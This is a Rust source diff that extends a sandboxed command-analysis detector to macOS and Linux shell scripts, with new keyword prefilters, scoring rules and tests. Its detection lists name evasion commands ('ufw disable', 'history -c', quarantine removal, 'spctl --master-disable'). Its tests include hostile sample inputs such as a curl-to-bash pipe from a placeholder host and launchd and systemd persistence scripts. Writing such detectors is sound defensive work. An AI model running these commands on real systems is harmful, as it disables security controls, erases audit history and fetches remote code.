@@ -1,7 +1,7 @@
 use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
 use emulator_core::{
-    sha256_hex, AnalysisLimits, Artifact, EventKind, HostSnapshot, Ioc, NetworkActivity,
-    NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
+    sha256_hex, AnalysisLimits, Artifact, EventKind, HostPlatform, HostSnapshot, Ioc,
+    NetworkActivity, NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
 };
 use runbox_emulator::{Runbox, RunboxError, RunboxInput};
 use serde::{Deserialize, Serialize};
@@ -10,7 +10,7 @@ use std::sync::LazyLock;
 use thiserror::Error;
 use url::Url;
 
-pub const REPORT_SCHEMA_VERSION: &str = "2";
+pub const REPORT_SCHEMA_VERSION: &str = "3";
 pub const MAX_DETECTOR_INPUT_BYTES: usize = 1024 * 1024;
 pub const DEFAULT_SAFE_SOURCE_URLS: &[&str] = &["https://gh.io/copilot-install"];
 
@@ -219,6 +219,7 @@ pub struct AnalysisReport {
     pub schema_version: String,
     pub analysis_mode: AnalysisMode,
     pub analysis_status: AnalysisStatus,
+    pub host_platform: HostPlatform,
     pub input: InputSummary,
     pub verdict: Verdict,
     pub risk: RiskAssessment,
@@ -257,6 +258,8 @@ pub enum AnalysisStatus {
 pub enum InputKind {
     RawCommand,
     PowerShellScript,
+    BashScript,
+    LinuxShellScript,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
@@ -298,6 +301,12 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     ("sh -c", PrefilterSignal::CommandInterpreter),
     ("python", PrefilterSignal::CommandInterpreter),
     ("osascript", PrefilterSignal::CommandInterpreter),
+    ("systemctl", PrefilterSignal::CommandInterpreter),
+    ("service ", PrefilterSignal::CommandInterpreter),
+    ("sudo ", PrefilterSignal::CommandInterpreter),
+    ("#!/bin/bash", PrefilterSignal::CommandInterpreter),
+    ("#!/bin/sh", PrefilterSignal::CommandInterpreter),
+    ("#!/bin/zsh", PrefilterSignal::CommandInterpreter),
     ("mshta", PrefilterSignal::NativeLauncher),
     ("rundll32", PrefilterSignal::NativeLauncher),
     ("regsvr32", PrefilterSignal::NativeLauncher),
@@ -320,6 +329,20 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     ("sc.exe", PrefilterSignal::NativeLauncher),
     ("makecab", PrefilterSignal::NativeLauncher),
     ("extrac32", PrefilterSignal::NativeLauncher),
+    ("launchctl", PrefilterSignal::NativeLauncher),
+    ("spctl", PrefilterSignal::NativeLauncher),
+    ("xattr", PrefilterSignal::NativeLauncher),
+    ("chmod +x", PrefilterSignal::NativeLauncher),
+    ("crontab", PrefilterSignal::NativeLauncher),
+    ("nohup", PrefilterSignal::NativeLauncher),
+    ("setsid", PrefilterSignal::NativeLauncher),
+    ("apt-get", PrefilterSignal::NativeLauncher),
+    ("dpkg", PrefilterSignal::NativeLauncher),
+    ("yum ", PrefilterSignal::NativeLauncher),
+    ("dnf ", PrefilterSignal::NativeLauncher),
+    ("rpm ", PrefilterSignal::NativeLauncher),
+    ("ssh ", PrefilterSignal::NativeLauncher),
+    ("nc ", PrefilterSignal::NativeLauncher),
     ("invoke-webrequest", PrefilterSignal::PowerShellSyntax),
     ("invoke-restmethod", PrefilterSignal::PowerShellSyntax),
     ("invoke-expression", PrefilterSignal::PowerShellSyntax),
@@ -379,6 +402,23 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     (".wsf", PrefilterSignal::ExecutableOrScript),
     (".jse", PrefilterSignal::ExecutableOrScript),
     (".vbe", PrefilterSignal::ExecutableOrScript),
+    (".sh", PrefilterSignal::ExecutableOrScript),
+    (".command", PrefilterSignal::ExecutableOrScript),
+    (".dmg", PrefilterSignal::ExecutableOrScript),
+    (".pkg", PrefilterSignal::ExecutableOrScript),
+    ("/tmp/", PrefilterSignal::ExecutableOrScript),
+    ("/library/launchagents", PrefilterSignal::ExecutableOrScript),
+    (
+        "/library/launchdaemons",
+        PrefilterSignal::ExecutableOrScript,
+    ),
+    ("/etc/systemd/system", PrefilterSignal::ExecutableOrScript),
+    ("/.config/systemd/user", PrefilterSignal::ExecutableOrScript),
+    ("/etc/cron.", PrefilterSignal::ExecutableOrScript),
+    ("/var/spool/cron", PrefilterSignal::ExecutableOrScript),
+    ("/etc/rc.local", PrefilterSignal::ExecutableOrScript),
+    (".service", PrefilterSignal::ExecutableOrScript),
+    (".desktop", PrefilterSignal::ExecutableOrScript),
     ("\\currentversion\\run", PrefilterSignal::ExecutableOrScript),
     ("shell:startup", PrefilterSignal::ExecutableOrScript),
     (
@@ -418,6 +458,22 @@ impl DetectorInput {
     pub fn powershell_script(content: impl Into<String>) -> Self {
         Self {
             kind: InputKind::PowerShellScript,
+            content: content.into(),
+        }
+    }
+
+    #[must_use]
+    pub fn bash_script(content: impl Into<String>) -> Self {
+        Self {
+            kind: InputKind::BashScript,
+            content: content.into(),
+        }
+    }
+
+    #[must_use]
+    pub fn linux_shell_script(content: impl Into<String>) -> Self {
+        Self {
+            kind: InputKind::LinuxShellScript,
             content: content.into(),
         }
     }
@@ -539,10 +595,16 @@ impl Detector {
 
     #[must_use]
     pub fn infer_input_kind(content: &str) -> InputKind {
+        let lowercase = content.to_ascii_lowercase();
+        if looks_like_macos_shell(&lowercase) {
+            return InputKind::BashScript;
+        }
+        if looks_like_linux_shell(content, &lowercase) {
+            return InputKind::LinuxShellScript;
+        }
         if Self::prefilter(content).decision == PrefilterDecision::DefinitelyBenign {
             return InputKind::RawCommand;
         }
-        let lowercase = content.to_ascii_lowercase();
         if content.contains('\n')
             || content.trim_start().starts_with('$')
             || lowercase.contains("invoke-webrequest")
@@ -603,13 +665,19 @@ impl Detector {
             ));
         }
         let input_summary = summarize_candidate_input(input_kind, content.as_bytes());
-        let mut runbox = Runbox::new(self.limits.clone());
+        let mut runbox = match kind {
+            InputKind::BashScript => Runbox::new_macos(self.limits.clone()),
+            InputKind::LinuxShellScript => Runbox::new_linux(self.limits.clone()),
+            InputKind::RawCommand | InputKind::PowerShellScript => Runbox::new(self.limits.clone()),
+        };
         runbox
             .host_mut()
             .set_network_policy(self.network_policy.clone());
         let result = runbox.emulate(match kind {
             InputKind::RawCommand => RunboxInput::RawCommand(content.clone()),
             InputKind::PowerShellScript => RunboxInput::PowerShellScript(content.clone()),
+            InputKind::BashScript => RunboxInput::BashScript(content.clone()),
+            InputKind::LinuxShellScript => RunboxInput::LinuxShellScript(content.clone()),
         });
         let (analysis_status, snapshot) = match result {
             Ok(result) => (AnalysisStatus::Emulated, result.snapshot),
@@ -650,6 +718,7 @@ impl Detector {
             schema_version: REPORT_SCHEMA_VERSION.into(),
             analysis_mode: mode,
             analysis_status,
+            host_platform: snapshot.platform,
             input: input_summary,
             verdict,
             risk,
@@ -718,7 +787,60 @@ const fn input_kind_name(kind: InputKind) -> &'static str {
     match kind {
         InputKind::RawCommand => "raw_command",
         InputKind::PowerShellScript => "powershell_script",
+        InputKind::BashScript => "bash_script",
+        InputKind::LinuxShellScript => "linux_shell_script",
     }
+}
+
+fn looks_like_macos_shell(lowercase: &str) -> bool {
+    lowercase.contains("launchctl")
+        || lowercase.contains("osascript")
+        || lowercase.contains("chmod +x")
+        || lowercase.contains("/library/launchagents")
+        || lowercase.contains("/library/launchdaemons")
+        || lowercase.contains("/applications/")
+        || lowercase.contains("com.apple.quarantine")
+}
+
+fn looks_like_linux_shell(content: &str, lowercase: &str) -> bool {
+    lowercase.starts_with("#!/bin/bash")
+        || lowercase.starts_with("#!/bin/sh")
+        || lowercase.starts_with("#!/bin/zsh")
+        || lowercase.starts_with("#!/usr/bin/env bash")
+        || lowercase.starts_with("#!/usr/bin/env sh")
+        || lowercase.starts_with("#!/usr/bin/env zsh")
+        || lowercase.contains("systemctl")
+        || lowercase.contains("crontab")
+        || lowercase.contains("apt-get")
+        || lowercase.contains("/etc/systemd/")
+        || lowercase.contains("/var/spool/cron")
+        || lowercase.contains("/proc/")
+        || lowercase.contains("curl") && lowercase.contains("| bash")
+        || lowercase.contains("wget") && lowercase.contains("| bash")
+        || lowercase.contains("${")
+        || contains_shell_assignment(content)
+        || content.contains('\n')
+            && (lowercase.contains("export ")
+                || lowercase.contains("; then")
+                || lowercase.contains("; do")
+                || lowercase.contains("\nthen")
+                || lowercase.contains("\ndo"))
+}
+
+fn contains_shell_assignment(content: &str) -> bool {
+    content
+        .split([';', '\n', '\r'])
+        .map(str::trim_start)
+        .filter_map(|segment| segment.split_whitespace().next())
+        .any(|word| {
+            let Some((name, _)) = word.split_once('=') else {
+                return false;
+            };
+            !name.is_empty()
+                && name.chars().enumerate().all(|(index, ch)| {
+                    ch == '_' || ch.is_ascii_alphanumeric() && (index > 0 || !ch.is_ascii_digit())
+                })
+        })
 }
 
 fn prefilter_benign_report(
@@ -731,6 +853,13 @@ fn prefilter_benign_report(
         schema_version: REPORT_SCHEMA_VERSION.into(),
         analysis_mode: mode,
         analysis_status: AnalysisStatus::PrefilterOnly,
+        host_platform: if kind == "bash_script" {
+            HostPlatform::MacOs
+        } else if kind == "linux_shell_script" {
+            HostPlatform::Linux
+        } else {
+            HostPlatform::Windows
+        },
         input: InputSummary {
             kind: kind.into(),
             size,
@@ -913,11 +1042,59 @@ fn evaluate_rules(
     add_text_rule(
         &mut findings,
         &lowercase,
+        "linux.privilege-wrapper",
+        "Linux privilege or detached-execution wrapper used",
+        Severity::Low,
+        4,
+        &["sudo ", "nohup ", "setsid ", "chroot "],
+    );
+    add_text_rule(
+        &mut findings,
+        &lowercase,
+        "linux.security-evasion",
+        "Linux security controls or audit history modified",
+        Severity::High,
+        20,
+        &[
+            "history -c",
+            "unset histfile",
+            "iptables -f",
+            "nft flush ruleset",
+            "ufw disable",
+            "setenforce 0",
+            "chattr +i",
+        ],
+    );
+    add_text_rule(
+        &mut findings,
+        &lowercase,
         "launcher.lolbin",
         "Windows native launcher or execution proxy used",
         Severity::Low,
         4,
         &["mshta", "rundll32", "regsvr32", "wscript", "cscript"],
+    );
+    add_text_rule(
+        &mut findings,
+        &lowercase,
+        "macos.script-automation",
+        "macOS AppleScript execution used",
+        Severity::Medium,
+        8,
+        &["osascript", "do shell script"],
+    );
+    add_text_rule(
+        &mut findings,
+        &lowercase,
+        "macos.security-bypass",
+        "macOS quarantine or application security controls modified",
+        Severity::High,
+        20,
+        &[
+            "xattr -d com.apple.quarantine",
+            "xattr -dr com.apple.quarantine",
+            "spctl --master-disable",
+        ],
     );
     add_text_rule(
         &mut findings,
@@ -958,6 +1135,21 @@ fn evaluate_rules(
                 "input combines COMSPEC, FOR /F command substitution, finger, and caret obfuscation"
                     .into(),
             ],
+        });
+    }
+    let finger_evidence = snapshot
+        .network_activity
+        .iter()
+        .filter(|activity| activity.url.starts_with("finger://"))
+        .map(|activity| format!("{} {}", activity.method, activity.url))
+        .collect::<Vec<_>>();
+    if lowercase.contains("finger") && lowercase.contains('@') && !finger_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "network.finger-download".into(),
+            title: "Finger protocol was used to retrieve a remote stage".into(),
+            severity: Severity::Critical,
+            score: 45,
+            evidence: finger_evidence,
         });
     }
     if (lowercase.contains("rundll32") || lowercase.contains("regsvr32"))
@@ -1034,6 +1226,7 @@ fn evaluate_rules(
     }
     let downloads = [
         "curl",
+        "wget",
         "invoke-webrequest",
         "invoke-restmethod",
         "downloadfile",
@@ -1054,6 +1247,11 @@ fn evaluate_rules(
         "rundll32",
         "regsvr32",
         "bash",
+        " sh",
+        "|sh",
+        "zsh",
+        "osascript",
+        "nohup",
     ];
     let has_download = contains_any(&lowercase, &downloads);
     let has_execution = contains_any(&lowercase, &executions);
@@ -1101,6 +1299,24 @@ fn evaluate_rules(
                 ],
             });
         }
+        if !trusted_download_execution
+            && snapshot
+                .trace
+                .iter()
+                .any(|event| event.kind == EventKind::Decode)
+            && contains_any(
+                &lowercase,
+                &["base64", " bash", "|bash", " zsh", "|zsh", " sh"],
+            )
+        {
+            findings.push(Finding {
+                rule_id: "shell.encoded-remote-command".into(),
+                title: "Encoded shell content produced network-capable execution".into(),
+                severity: Severity::Critical,
+                score: 40,
+                evidence: vec!["decoded shell content produced a modeled network request".into()],
+            });
+        }
     }
 
     let process_evidence = unique_event_evidence(snapshot, EventKind::ProcessIntent);
@@ -1111,6 +1327,51 @@ fn evaluate_rules(
             severity: Severity::Low,
             score: 5,
             evidence: process_evidence,
+        });
+    }
+
+    let remote_proxy_evidence = snapshot
+        .trace
+        .iter()
+        .filter(|event| event.kind == EventKind::ProcessIntent)
+        .filter_map(|event| {
+            let program = event.data.get("program")?;
+            let program = program
+                .trim_matches('"')
+                .rsplit(['\\', '/'])
+                .next()
+                .unwrap_or(program)
+                .to_ascii_lowercase();
+            let command_line = event.data.get("command_line")?.to_ascii_lowercase();
+            let proxy = matches!(
+                program.as_str(),
+                "mshta"
+                    | "mshta.exe"
+                    | "rundll32"
+                    | "rundll32.exe"
+                    | "regsvr32"
+                    | "regsvr32.exe"
+                    | "wscript"
+                    | "wscript.exe"
+                    | "cscript"
+                    | "cscript.exe"
+                    | "pcalua"
+                    | "pcalua.exe"
+            );
+            let remote = contains_any(&command_line, &["http://", "https://", "hxxp", r"\\"]);
+            (proxy && remote).then(|| event.message.clone())
+        })
+        .collect::<BTreeSet<_>>()
+        .into_iter()
+        .take(10)
+        .collect::<Vec<_>>();
+    if !remote_proxy_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "behavior.remote-execution-proxy".into(),
+            title: "Dynamically resolved execution proxy launched remote content".into(),
+            severity: Severity::Critical,
+            score: 40,
+            evidence: remote_proxy_evidence,
         });
     }
 
@@ -1144,6 +1405,17 @@ fn evaluate_rules(
             severity: Severity::Medium,
             score: 8,
             evidence: decode_evidence,
+        });
+    }
+
+    let decode_execution_evidence = decode_write_execute_evidence(snapshot);
+    if !decode_execution_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "chain.decode-write-execute".into(),
+            title: "Decoded content was written and executed".into(),
+            severity: Severity::Critical,
+            score: 35,
+            evidence: decode_execution_evidence,
         });
     }
 
@@ -1203,6 +1475,78 @@ fn evaluate_rules(
         });
     }
 
+    let launchd_evidence = snapshot
+        .trace
+        .iter()
+        .filter(|event| {
+            event
+                .data
+                .get("persistence_kind")
+                .is_some_and(|kind| kind == "macos_launchd")
+        })
+        .map(|event| event.message.clone())
+        .collect::<BTreeSet<_>>()
+        .into_iter()
+        .take(10)
+        .collect::<Vec<_>>();
+    if !launchd_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "macos.launchd-persistence".into(),
+            title: "Payload loaded or modified macOS launchd persistence".into(),
+            severity: Severity::Critical,
+            score: 40,
+            evidence: launchd_evidence,
+        });
+    }
+
+    let linux_persistence_evidence = snapshot
+        .trace
+        .iter()
+        .filter(|event| {
+            event
+                .data
+                .get("persistence_kind")
+                .is_some_and(|kind| kind.starts_with("linux_"))
+        })
+        .map(|event| event.message.clone())
+        .collect::<BTreeSet<_>>()
+        .into_iter()
+        .take(10)
+        .collect::<Vec<_>>();
+    if !linux_persistence_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "linux.persistence".into(),
+            title: "Payload configured Linux service or scheduled-task persistence".into(),
+            severity: Severity::Critical,
+            score: 40,
+            evidence: linux_persistence_evidence,
+        });
+    }
+
+    let credential_evidence = snapshot
+        .trace
+        .iter()
+        .filter(|event| {
+            event
+                .data
+                .get("credential_access")
+                .is_some_and(|value| value == "true")
+        })
+        .map(|event| event.message.clone())
+        .collect::<BTreeSet<_>>()
+        .into_iter()
+        .take(10)
+        .collect::<Vec<_>>();
+    if !credential_evidence.is_empty() {
+        findings.push(Finding {
+            rule_id: "behavior.credential-access".into(),
+            title: "Payload attempted credential authentication or access".into(),
+            severity: Severity::High,
+            score: 15,
+            evidence: credential_evidence,
+        });
+    }
+
     findings
 }
 
@@ -1253,12 +1597,29 @@ fn contains_any(input: &str, needles: &[&str]) -> bool {
 }
 
 fn download_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
-    let network_sequences = snapshot
+    let source_sequences = snapshot
         .trace
         .iter()
         .filter(|event| event.kind == EventKind::NetworkIntent)
         .map(|event| event.sequence)
         .collect::<Vec<_>>();
+    write_execute_evidence_after(snapshot, &source_sequences)
+}
+
+fn decode_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
+    let source_sequences = snapshot
+        .trace
+        .iter()
+        .filter(|event| event.kind == EventKind::Decode)
+        .map(|event| event.sequence)
+        .collect::<Vec<_>>();
+    write_execute_evidence_after(snapshot, &source_sequences)
+}
+
+fn write_execute_evidence_after(
+    snapshot: &HostSnapshot,
+    source_sequences: &[usize],
+) -> Vec<String> {
     let process_events = snapshot
         .trace
         .iter()
@@ -1270,21 +1631,31 @@ fn download_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
         .filter(|event| event.kind == EventKind::FileWrite)
         .filter_map(|write| {
             let path = write.data.get("path")?;
-            if path.is_empty() || !looks_executable(path) {
+            let normalized_path = normalize_for_correlation(path);
+            let executable = looks_executable(path)
+                || write
+                    .data
+                    .get("entry_type")
+                    .is_some_and(|entry_type| entry_type == "executable")
+                || snapshot.virtual_files.iter().any(|file| {
+                    file.executable && normalize_for_correlation(&file.path) == normalized_path
+                });
+            if path.is_empty() || !executable {
                 return None;
             }
-            if !network_sequences
+            if !source_sequences
                 .iter()
                 .any(|sequence| *sequence < write.sequence)
             {
                 return None;
             }
-            let normalized_path = normalize_for_correlation(path);
             let process = process_events.iter().find(|process| {
                 process.sequence > write.sequence
-                    && process.data.get("command_line").is_some_and(|command| {
+                    && (process.data.get("command_line").is_some_and(|command| {
                         normalize_for_correlation(command).contains(&normalized_path)
-                    })
+                    }) || process.data.get("program").is_some_and(|program| {
+                        normalize_for_correlation(program) == normalized_path
+                    }))
             })?;
             Some(format!("{} followed by {}", write.message, process.message))
         })
@@ -1327,6 +1698,17 @@ fn is_autorun_path(path: &str) -> bool {
         r"\start menu\programs\startup\",
         r"\windows\system32\tasks\",
         r"\windows\tasks\",
+        "/library/launchagents/",
+        "/library/launchdaemons/",
+        "/users/analysis/library/launchagents/",
+        "/etc/systemd/system/",
+        "/lib/systemd/system/",
+        "/home/analysis/.config/systemd/user/",
+        "/etc/cron.d/",
+        "/etc/cron.daily/",
+        "/var/spool/cron/",
+        "/home/analysis/.config/autostart/",
+        "/etc/rc.local",
     ]
     .iter()
     .any(|location| path.contains(location))
@@ -1607,6 +1989,73 @@ mod tests {
     }
 
     #[test]
+    fn bash_scripts_use_the_macos_host_and_detect_launchd_persistence() {
+        let payload = r#"
+printf '<plist>safe</plist>\n' > "$HOME/Library/LaunchAgents/com.example.update.plist"
+launchctl load "$HOME/Library/LaunchAgents/com.example.update.plist"
+"#;
+        assert_eq!(Detector::infer_input_kind(payload), InputKind::BashScript);
+
+        let report = Detector::default()
+            .analyze(DetectorInput::bash_script(payload))
+            .unwrap();
+
+        assert_eq!(report.input.kind, "bash_script");
+        assert!(report.virtual_files.iter().any(|file| file
+            .path
+            .ends_with("/Library/LaunchAgents/com.example.update.plist")));
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == "macos.launchd-persistence"));
+    }
+
+    #[test]
+    fn automatic_kind_inference_recognizes_shell_assignments() {
+        assert_eq!(
+            Detector::infer_input_kind("name=world; echo \"$name\""),
+            InputKind::LinuxShellScript
+        );
+    }
+
+    #[test]
+    fn linux_shell_scripts_use_linux_host_and_detect_persistence() {
+        let payload = r"
+printf '[Service]\nExecStart=/tmp/agent\n' > /etc/systemd/system/example.service
+systemctl enable --now /etc/systemd/system/example.service
+";
+        assert_eq!(
+            Detector::infer_input_kind(payload),
+            InputKind::LinuxShellScript
+        );
+
+        let report = Detector::default()
+            .analyze(DetectorInput::linux_shell_script(payload))
+            .unwrap();
+
+        assert_eq!(report.host_platform, HostPlatform::Linux);
+        assert_eq!(report.input.kind, "linux_shell_script");
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == "linux.persistence"));
+    }
+
+    #[test]
+    fn linux_security_control_changes_are_scored() {
+        let report = Detector::default()
+            .analyze(DetectorInput::linux_shell_script(
+                "sudo ufw disable; history -c; unset HISTFILE",
+            ))
+            .unwrap();
+
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == "linux.security-evasion"));
+    }
+
+    #[test]
     fn safe_source_matching_rejects_lookalikes_and_mixed_sources() {
         let lookalike = Detector::default()
             .analyze(DetectorInput::raw_command(
@@ -1675,6 +2124,10 @@ mod tests {
             r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d payload",
             "msbuild payload.xml",
             "&('i'+'ex') 'Write-Output test'",
+            "osascript -e 'do shell script \"curl https://example.invalid/a | bash\"'",
+            "launchctl load ~/Library/LaunchAgents/com.example.plist",
+            "systemctl enable --now /etc/systemd/system/example.service",
+            "sudo crontab /tmp/jobs",
         ] {
             assert_eq!(
                 Detector::prefilter(content).decision,
